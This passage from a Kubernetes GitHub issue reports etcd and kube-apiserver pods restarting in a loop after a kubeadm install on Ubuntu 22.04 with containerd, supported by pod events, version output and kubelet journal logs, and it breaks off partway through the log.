HostPath (bare host directory volume)\r\n    Path:          /etc/kubernetes/pki/etcd\r\n    HostPathType:  DirectoryOrCreate\r\n  etcd-data:\r\n    Type:          HostPath (bare host directory volume)\r\n    Path:          /var/lib/etcd\r\n    HostPathType:  DirectoryOrCreate\r\nQoS Class:         Burstable\r\nNode-Selectors:    <none>\r\nTolerations:       :NoExecute op=Exists\r\nEvents:\r\n  Type     Reason          Age                    From     Message\r\n  ----     ------          ----                   ----     -------\r\n  Warning  Unhealthy       7m30s (x4 over 8m)     kubelet  Liveness probe failed: Get \"http://127.0.0.1:2381/health\": dial tcp 127.0.0.1:2381: connect: connection refused\r\n  Warning  Unhealthy       6m25s (x3 over 9m25s)  kubelet  Startup probe failed: Get \"http://127.0.0.1:2381/health\": dial tcp 127.0.0.1:2381: connect: connection refused\r\n  Normal   SandboxChanged  6m18s (x3 over 9m15s)  kubelet  Pod sandbox changed, it will be killed and re-created.\r\n  Normal   Pulled          6m18s (x3 over 9m15s)  kubelet  Container image \"k8s.gcr.io/etcd:3.5.3-0\" already present on machine\r\n  Normal   Created         6m18s (x3 over 9m15s)  kubelet  Created container etcd\r\n  Normal   Started         6m18s (x3 over 9m15s)  kubelet  Started container etcd\r\n  Normal   Killing         4m58s (x4 over 9m35s)  kubelet  Stopping container etcd\r\n  Warning  BackOff         4m57s (x2 over 4m58s)  kubelet  Back-off restarting failed container\r\n  Normal   Killing         33s                    kubelet  Stopping container etcd\r\n```\r\n</details>\n\n### Anything else we need to know?\n\nThe same install works without any problem under ubuntu focal (20.04)\r\nThe install is 100% automated (the only change is the ubuntu version)\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\n$ kubectl version\r\nWARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.\r\nClient Version: version.Info{Major:\"1\", Minor:\"24\", GitVersion:\"v1.24.0\", GitCommit:\"4ce5a8954017644c5420bae81d72b09b735c21f0\", GitTreeState:\"clean\", BuildDate:\"2022-05-03T13:46:05Z\", GoVersion:\"go1.18.1\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\nKustomize Version: v4.5.4\r\nServer Version: version.Info{Major:\"1\", Minor:\"24\", GitVersion:\"v1.24.0\", GitCommit:\"4ce5a8954017644c5420bae81d72b09b735c21f0\", GitTreeState:\"clean\", BuildDate:\"2022-05-03T13:38:19Z\", GoVersion:\"go1.18.1\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\n```\r\n\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\nNone\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\nPRETTY_NAME=\"Ubuntu 22.04 LTS\"\r\nNAME=\"Ubuntu\"\r\nVERSION_ID=\"22.04\"\r\nVERSION=\"22.04 LTS (Jammy Jellyfish)\"\r\nVERSION_CODENAME=jammy\r\nID=ubuntu\r\nID_LIKE=debian\r\nHOME_URL=\"https://www.ubuntu.com/\"\r\nSUPPORT_URL=\"https://help.ubuntu.com/\"\r\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\r\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\r\nUBUNTU_CODENAME=jammy\r\n$ uname -a\r\nLinux master0 5.15.0-33-generic #34-Ubuntu SMP Wed May 18 13:34:26 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\nkubeadm\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\ncontainerd\r\n\r\n```\r\nroot@master0:~# containerd --version\r\ncontainerd github.com/containerd/containerd 1.5.9-0ubuntu3 \r\n```\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\nNone (weave should have been installed but the cluster is not stable enough to run the kubectl apply during the installation process)\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/network", "kind/support", "sig/cluster-lifecycle", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "@Congelli501: This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pacoxu", "body": "/kind support\r\nWould you provide more kubelet logs to convince us that it is a Kubernetes bug or your node/configuration problem?"}, {"author": "Congelli501", "body": "It seems all the logs are caused by the flaky apiserver that constantly restart and the fact that no CNI is initialized yet.\r\n\r\nFrom what I got from `kubelet describe`, the pod restart seems to be linked to the `SandboxChanged` event, which is fired on a `SandboxID` change on the container.\r\nhttps://github.com/kubernetes/kubernetes/blob/520b991347b9c77635c0e4555f1703a86dcdd4ff/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L721\r\nI can't find how sandboxID is built nor why it would change\r\n\r\nHere is the first 300 lines of the kubelet log after a reboot:\r\n<details>\r\n\r\n```\r\nroot@master0:~# journalctl -u kubelet.service -b | head -n300\r\nMay 24 18:19:46 master0 systemd[1]: Started kubelet: The Kubernetes Node Agent.\r\nMay 24 18:19:45 master0 kubelet[518]: Flag --container-runtime has been deprecated, will be removed in 1.27 as the only valid value is 'remote'\r\nMay 24 18:19:45 master0 kubelet[518]: Flag --pod-infra-container-image has been deprecated, will be removed in 1.27. Image garbage collector will get sandbox image information from CRI.\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.707378     518 server.go:193] \"--pod-infra-container-image will not be pruned by the image garbage collector in kubelet and should also be set in the remote runtime\"\r\nMay 24 18:19:45 master0 kubelet[518]: Flag --container-runtime has been deprecated, will be removed in 1.27 as the only valid value is 'remote'\r\nMay 24 18:19:45 master0 kubelet[518]: Flag --pod-infra-container-image has been deprecated, will be removed in 1.27. Image garbage collector will get sandbox image information from CRI.\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.737035     518 server.go:399] \"Kubelet version\" kubeletVersion=\"v1.24.0\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.737070     518 server.go:401] \"Golang settings\" GOGC=\"\" GOMAXPROCS=\"\" GOTRACEBACK=\"\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.737986     518 server.go:813] \"Client rotation is on, will bootstrap in background\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.740669     518 certificate_store.go:130] Loading cert/key pair from \"/var/lib/kubelet/pki/kubelet-client-current.pem\".\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.746970     518 dynamic_cafile_content.go:157] \"Starting controller\" name=\"client-ca-bundle::/etc/kubernetes/pki/ca.crt\"\r\nMay 24 18:19:45 master0 kubelet[518]: W0524 18:19:45.749027     518 manager.go:159] Cannot detect current cgroup on cgroup v2\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.754857     518 server.go:648] \"--cgroups-per-qos enabled, but --cgroup-root was not specified.  defaulting to /\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.755491     518 container_manager_linux.go:262] \"Container manager verified user specified cgroup-root exists\" cgroupRoot=[]\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.755547     518 container_manager_linux.go:267] \"Creating Container Manager object based on Node Config\" nodeConfig={RuntimeCgroupsName: SystemCgroupsName: KubeletCgroupsName: KubeletOOMScoreAdj:-999 ContainerRuntime: CgroupsPerQOS:true CgroupRoot:/ CgroupDriver:systemd KubeletRootDir:/var/lib/kubelet ProtectKernelDefaults:false NodeAllocatableConfig:{KubeReservedCgroupName: SystemReservedCgroupName: ReservedSystemCPUs: EnforceNodeAllocatable:map[pods:{}] KubeReserved:map[] SystemReserved:map[] HardEvictionThresholds:[{Signal:nodefs.available Operator:LessThan Value:{Quantity:<nil> Percentage:0.1} GracePeriod:0s MinReclaim:<nil>} {Signal:nodefs.inodesFree Operator:LessThan Value:{Quantity:<nil> Percentage:0.05} GracePeriod:0s MinReclaim:<nil>} {Signal:imagefs.available Operator:LessThan Value:{Quantity:<nil> Percentage:0.15} GracePeriod:0s MinReclaim:<nil>} {Signal:memory.available Operator:LessThan Value:{Quantity:100Mi Percentage:0} GracePeriod:0s MinReclaim:<nil>}]} QOSReserved:map[] ExperimentalCPUManagerPolicy:none ExperimentalCPUManagerPolicyOptions:map[] ExperimentalTopologyManagerScope:container ExperimentalCPUManagerReconcilePeriod:10s ExperimentalMemoryManagerPolicy:None ExperimentalMemoryManagerReservedMemory:[] ExperimentalPodPidsLimit:-1 EnforceCPULimits:true CPUCFSQuotaPeriod:100ms ExperimentalTopologyManagerPolicy:none}\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.755566     518 topology_manager.go:133] \"Creating topology manager with policy per scope\" topologyPolicyName=\"none\" topologyScopeName=\"container\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.755573     518 container_manager_linux.go:302] \"Creating device plugin manager\" devicePluginEnabled=true\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.755601     518 state_mem.go:36] \"Initialized new in-memory state store\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.760709     518 kubelet.go:376] \"Attempting to sync node with API server\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.760867     518 kubelet.go:267] \"Adding static pod path\" path=\"/etc/kubernetes/manifests\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.761186     518 kubelet.go:278] \"Adding apiserver pod source\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.761339     518 apiserver.go:42] \"Waiting for node sync before watching apiserver pods\"\r\nMay 24 18:19:45 master0 kubelet[518]: W0524 18:19:45.762544     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.Node: Get \"https://10.88.3.60:6443/api/v1/nodes?fieldSelector=metadata.name%3Dmaster0&limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.762596     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.Node: failed to list *v1.Node: Get \"https://10.88.3.60:6443/api/v1/nodes?fieldSelector=metadata.name%3Dmaster0&limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: W0524 18:19:45.765190     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.Service: Get \"https://10.88.3.60:6443/api/v1/services?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.765475     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.Service: failed to list *v1.Service: Get \"https://10.88.3.60:6443/api/v1/services?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.770934     518 kuberuntime_manager.go:239] \"Container runtime initialized\" containerRuntime=\"containerd\" version=\"1.5.9-0ubuntu3\" apiVersion=\"v1alpha2\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.773106     518 server.go:1181] \"Started kubelet\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.773625     518 server.go:150] \"Starting to listen\" address=\"0.0.0.0\" port=10250\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.774679     518 server.go:410] \"Adding debug handlers to kubelet server\"\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.775043     518 event.go:276] Unable to write event: '&v1.Event{TypeMeta:v1.TypeMeta{Kind:\"\", APIVersion:\"\"}, ObjectMeta:v1.ObjectMeta{Name:\"master0.16f21d7153d06a40\", GenerateName:\"\", Namespace:\"default\", SelfLink:\"\", UID:\"\", ResourceVersion:\"\", Generation:0, CreationTimestamp:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), DeletionTimestamp:<nil>, DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:[]v1.OwnerReference(nil), Finalizers:[]string(nil), ZZZ_DeprecatedClusterName:\"\", ManagedFields:[]v1.ManagedFieldsEntry(nil)}, InvolvedObject:v1.ObjectReference{Kind:\"Node\", Namespace:\"\", Name:\"master0\", UID:\"master0\", APIVersion:\"\", ResourceVersion:\"\", FieldPath:\"\"}, Reason:\"Starting\", Message:\"Starting kubelet.\", Source:v1.EventSource{Component:\"kubelet\", Host:\"master0\"}, FirstTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), LastTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), Count:1, Type:\"Normal\", EventTime:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), Series:(*v1.EventSeries)(nil), Action:\"\", Related:(*v1.ObjectReference)(nil), ReportingController:\"\", ReportingInstance:\"\"}': 'Post \"https://10.88.3.60:6443/api/v1/namespaces/default/events\": dial tcp 10.88.3.60:6443: connect: connection refused'(may retry after sleeping)\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.775996     518 cri_stats_provider.go:455] \"Failed to get the info of the filesystem with mountpoint\" err=\"unable to find data in memory cache\" mountpoint=\"/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs\"\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.776037     518 kubelet.go:1298] \"Image garbage collection failed once. Stats initialization may not have completed yet\" err=\"invalid capacity 0 on image filesystem\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.777272     518 scope.go:110] \"RemoveContainer\" containerID=\"bbd5cf52c256a5dade01dc92cd71fe58aea818dc051747e39c922ef40fe6ce4b\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.777437     518 fs_resource_analyzer.go:67] \"Starting FS ResourceAnalyzer\"\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.779457     518 controller.go:144] failed to ensure lease exists, will retry in 200ms, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.779239     518 volume_manager.go:289] \"Starting Kubelet Volume Manager\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.780837     518 desired_state_of_world_populator.go:145] \"Desired state populator starts to run\"\r\nMay 24 18:19:45 master0 kubelet[518]: W0524 18:19:45.780928     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.CSIDriver: Get \"https://10.88.3.60:6443/apis/storage.k8s.io/v1/csidrivers?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.780964     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.CSIDriver: failed to list *v1.CSIDriver: Get \"https://10.88.3.60:6443/apis/storage.k8s.io/v1/csidrivers?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.781063     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.793747     518 cpu_manager.go:213] \"Starting CPU manager\" policy=\"none\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.793758     518 cpu_manager.go:214] \"Reconciling\" reconcilePeriod=\"10s\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.793784     518 state_mem.go:36] \"Initialized new in-memory state store\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.855402     518 state_mem.go:88] \"Updated default CPUSet\" cpuSet=\"\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.855487     518 state_mem.go:96] \"Updated CPUSet assignments\" assignments=map[]\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.855504     518 policy_none.go:49] \"None policy: Start\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.857594     518 memory_manager.go:168] \"Starting memorymanager\" policy=\"None\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.857787     518 state_mem.go:35] \"Initializing new in-memory state store\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.858634     518 state_mem.go:75] \"Updated machine memory state\"\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.880225     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.881191     518 kubelet_node_status.go:70] \"Attempting to register node\" node=\"master0\"\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.881726     518 kubelet_node_status.go:92] \"Unable to register node with API server\" err=\"Post \\\"https://10.88.3.60:6443/api/v1/nodes\\\": dial tcp 10.88.3.60:6443: connect: connection refused\" node=\"master0\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.915105     518 manager.go:610] \"Failed to read data from checkpoint\" checkpoint=\"kubelet_internal_checkpoint\" err=\"checkpoint is not found\"\r\nMay 24 18:19:45 master0 kubelet[518]: I0524 18:19:45.915476     518 plugin_manager.go:114] \"Starting Kubelet Plugin Manager\"\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.916231     518 eviction_manager.go:254] \"Eviction manager: failed to get summary stats\" err=\"failed to get node info: node \\\"master0\\\" not found\"\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.979873     518 controller.go:144] failed to ensure lease exists, will retry in 400ms, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:45 master0 kubelet[518]: E0524 18:19:45.980915     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.023533     518 kubelet_network_linux.go:76] \"Initialized protocol iptables rules.\" protocol=IPv4\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.060331     518 kubelet_network_linux.go:76] \"Initialized protocol iptables rules.\" protocol=IPv6\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.060522     518 status_manager.go:161] \"Starting to sync pod status with apiserver\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.060631     518 kubelet.go:1974] \"Starting kubelet main sync loop\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.060803     518 kubelet.go:1998] \"Skipping pod synchronization\" err=\"PLEG is not healthy: pleg has yet to be successful\"\r\nMay 24 18:19:46 master0 kubelet[518]: W0524 18:19:46.063595     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.RuntimeClass: Get \"https://10.88.3.60:6443/apis/node.k8s.io/v1/runtimeclasses?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.063783     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.RuntimeClass: failed to list *v1.RuntimeClass: Get \"https://10.88.3.60:6443/apis/node.k8s.io/v1/runtimeclasses?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.081026     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.083034     518 kubelet_node_status.go:70] \"Attempting to register node\" node=\"master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.083499     518 kubelet_node_status.go:92] \"Unable to register node with API server\" err=\"Post \\\"https://10.88.3.60:6443/api/v1/nodes\\\": dial tcp 10.88.3.60:6443: connect: connection refused\" node=\"master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.161087     518 topology_manager.go:200] \"Topology Admit Handler\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.162565     518 topology_manager.go:200] \"Topology Admit Handler\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.163696     518 topology_manager.go:200] \"Topology Admit Handler\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.164747     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.165093     518 topology_manager.go:200] \"Topology Admit Handler\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.166291     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167198     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167441     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"9b22268671b35f95a232195864ff89c05352da0583b343581e6de3e612cbdd0e\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167469     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"e1695308f8981a20c9b9f7873e05c9af1c6ea802aa9f4438bd73849807561301\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167478     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"e6f427af5098b9dc994317e7768222f272b8be208c1b90e6cb6bd2b780a3f9b3\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167484     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"0a6956ea481436282b52087017fd160d105b0d6a1a0da1e47e7de61860691e1a\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167493     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"54e668f4f86e0ed0703f4919a00e8c61e742d5144df963490b34b1f08217b5d2\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167500     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"ffa91f087f9c051c22d8dded4c0a5017e1713493ecbf81e91d030e052b6d3a89\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167507     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"6a85776a547957cc1180daae554f97e16bf0f35e66c0296dcb55f5f7b2555652\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167515     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"f765d736bafce8cec9c265620a729b9d4be11909ed1211a36adefc0634de61ef\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.167521     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"9c2f9378fd2b7e7b6d389757dabb85447bb0ba7e69080e0dda5482a2a8123872\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.168901     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.181192     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.281656     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.282171     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"usr-share-ca-certificates\\\" (UniqueName: \\\"kubernetes.io/host-path/7b1a28f140e1f4144f7bd4fae347b484-usr-share-ca-certificates\\\") pod \\\"kube-apiserver-master0\\\" (UID: \\\"7b1a28f140e1f4144f7bd4fae347b484\\\") \" pod=\"kube-system/kube-apiserver-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.282223     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"ca-certs\\\" (UniqueName: \\\"kubernetes.io/host-path/07dc1079c410123fdbdd120d096c4f3e-ca-certs\\\") pod \\\"kube-controller-manager-master0\\\" (UID: \\\"07dc1079c410123fdbdd120d096c4f3e\\\") \" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.282421     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"etc-ca-certificates\\\" (UniqueName: \\\"kubernetes.io/host-path/07dc1079c410123fdbdd120d096c4f3e-etc-ca-certificates\\\") pod \\\"kube-controller-manager-master0\\\" (UID: \\\"07dc1079c410123fdbdd120d096c4f3e\\\") \" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.282948     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"usr-local-share-ca-certificates\\\" (UniqueName: \\\"kubernetes.io/host-path/07dc1079c410123fdbdd120d096c4f3e-usr-local-share-ca-certificates\\\") pod \\\"kube-controller-manager-master0\\\" (UID: \\\"07dc1079c410123fdbdd120d096c4f3e\\\") \" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283072     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"k8s-certs\\\" (UniqueName: \\\"kubernetes.io/host-path/7b1a28f140e1f4144f7bd4fae347b484-k8s-certs\\\") pod \\\"kube-apiserver-master0\\\" (UID: \\\"7b1a28f140e1f4144f7bd4fae347b484\\\") \" pod=\"kube-system/kube-apiserver-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283119     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"kubeconfig\\\" (UniqueName: \\\"kubernetes.io/host-path/07dc1079c410123fdbdd120d096c4f3e-kubeconfig\\\") pod \\\"kube-controller-manager-master0\\\" (UID: \\\"07dc1079c410123fdbdd120d096c4f3e\\\") \" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283300     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"usr-share-ca-certificates\\\" (UniqueName: \\\"kubernetes.io/host-path/07dc1079c410123fdbdd120d096c4f3e-usr-share-ca-certificates\\\") pod \\\"kube-controller-manager-master0\\\" (UID: \\\"07dc1079c410123fdbdd120d096c4f3e\\\") \" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283451     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"etcd-certs\\\" (UniqueName: \\\"kubernetes.io/host-path/3da0b3b3f5b168e56c71dd2c6212a28e-etcd-certs\\\") pod \\\"etcd-master0\\\" (UID: \\\"3da0b3b3f5b168e56c71dd2c6212a28e\\\") \" pod=\"kube-system/etcd-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283484     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"ca-certs\\\" (UniqueName: \\\"kubernetes.io/host-path/7b1a28f140e1f4144f7bd4fae347b484-ca-certs\\\") pod \\\"kube-apiserver-master0\\\" (UID: \\\"7b1a28f140e1f4144f7bd4fae347b484\\\") \" pod=\"kube-system/kube-apiserver-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283511     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"etc-ca-certificates\\\" (UniqueName: \\\"kubernetes.io/host-path/7b1a28f140e1f4144f7bd4fae347b484-etc-ca-certificates\\\") pod \\\"kube-apiserver-master0\\\" (UID: \\\"7b1a28f140e1f4144f7bd4fae347b484\\\") \" pod=\"kube-system/kube-apiserver-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283760     518 reconciler.go:270] 